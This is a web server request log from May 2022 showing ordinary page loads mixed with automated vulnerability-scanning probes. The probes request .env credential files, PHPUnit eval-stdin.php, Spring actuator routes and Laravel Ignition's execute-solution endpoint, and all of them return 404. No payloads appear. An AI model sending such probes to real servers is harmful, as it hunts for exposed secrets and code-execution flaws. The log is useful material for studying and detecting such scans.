[27/May/2022 19:24:05] "GET /protected/.env HTTP/1.0" 404 2190
Not Found: /newsite/.env
[27/May/2022 19:24:05] "GET /newsite/.env HTTP/1.0" 404 2184
Not Found: /www/.env
[27/May/2022 19:24:05] "GET /www/.env HTTP/1.0" 404 2172
Not Found: /sites/all/libraries/mailchimp/.env
[27/May/2022 19:24:05] "GET /sites/all/libraries/mailchimp/.env HTTP/1.0" 404 2250
Not Found: /database/.env
[27/May/2022 19:24:05] "GET /database/.env HTTP/1.0" 404 2187
[27/May/2022 19:24:05] "GET /public/.env HTTP/1.0" 404 1634
Not Found: /14.225.16.78/.env
[27/May/2022 19:24:05] "GET /14.225.16.78/.env HTTP/1.0" 404 2199
[27/May/2022 19:24:05] "POST / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[27/May/2022 19:24:05] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
[27/May/2022 19:24:15] "GET / HTTP/1.0" 302 0
[27/May/2022 19:29:07] "GET / HTTP/1.0" 302 0
[27/May/2022 19:29:09] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 19:32:14] "GET / HTTP/1.0" 302 0
[27/May/2022 19:48:14] "GET / HTTP/1.0" 302 0
[27/May/2022 19:52:34] "GET / HTTP/1.0" 302 0
Not Found: /robots.txt
[27/May/2022 19:57:37] "GET /robots.txt HTTP/1.0" 404 2178
Not Found: /actuator/gateway/routes
[27/May/2022 20:16:43] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:56] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:56] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 21:34:57] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[27/May/2022 23:06:45] "GET / HTTP/1.0" 302 0
[27/May/2022 23:06:46] "GET / HTTP/1.0" 302 0
[27/May/2022 23:06:46] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 23:27:01] "HEAD / HTTP/1.0" 302 0
Not Found: /.env
[27/May/2022 23:27:01] "GET /.env HTTP/1.0" 404 2160
[27/May/2022 23:27:02] "POST / HTTP/1.0" 302 0
Not Found: /.env
[27/May/2022 23:50:20] "GET /.env HTTP/1.0" 404 2160
[27/May/2022 23:50:21] "POST / HTTP/1.0" 302 0
[28/May/2022 00:01:27] "GET / HTTP/1.0" 302 0
[28/May/2022 00:19:30] "GET / HTTP/1.0" 302 0
[28/May/2022 00:29:34] "GET / HTTP/1.0" 302 0
[28/May/2022 00:30:48] "GET / HTTP/1.0" 302 0
Not Found: /robots.txt
[28/May/2022 00:30:49] "GET /robots.txt HTTP/1.0" 404 2186
Not Found: /robots.txt
[28/May/2022 00:30:50] "GET /robots.txt HTTP/1.0" 404 2186
[28/May/2022 00:30:50] "GET / HTTP/1.0" 302 0
[28/May/2022 00:30:50] "GET /public/index.html HTTP/1.0" 200 2139
[28/May/2022 00:30:52] "GET /public/static/media/primeicons.91bacab1.ttf HTTP/1.0" 200 66644
[28/May/2022 00:30:52] "GET / HTTP/1.0" 302 0
[28/May/2022 00:30:52] "GET /public/index.html HTTP/1.0" 200 2139
[28/May/2022 00:32:54] "HEAD / HTTP/1.0" 302 0
[28/May/2022 00:32:54] "HEAD /public/index.html HTTP/1.0" 200 2139
[28/May/2022 00:33:25] "GET / HTTP/1.0" 302 0
[28/May/2022 00:33:25] "GET /public/index.html HTTP/1.0" 200 2139
[28/May/2022 00:33:30] "GET / HTTP/1.0" 302 0
[28/May/2022 00:33:31] "GET / HTTP/1.0" 302 0
[28/May/2022 00:37:41] "GET / HTTP/1.0" 302 0
[28/May/2022 00:37:41] "GET /public/index.html HTTP/1.0" 200 2139
[28/May/2022 01:32:56] "GET / HTTP/1.0" 302 0
[28/May/2022 02:03:08] "GET / HTTP/1.0" 302 0
[28/May/2022 02:04:34] "GET / HTTP/1.0" 302 0
[28/May/2022 02:04:34] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:02] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:03] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:04] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:04] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:06] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[28/May/2022 02:51:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
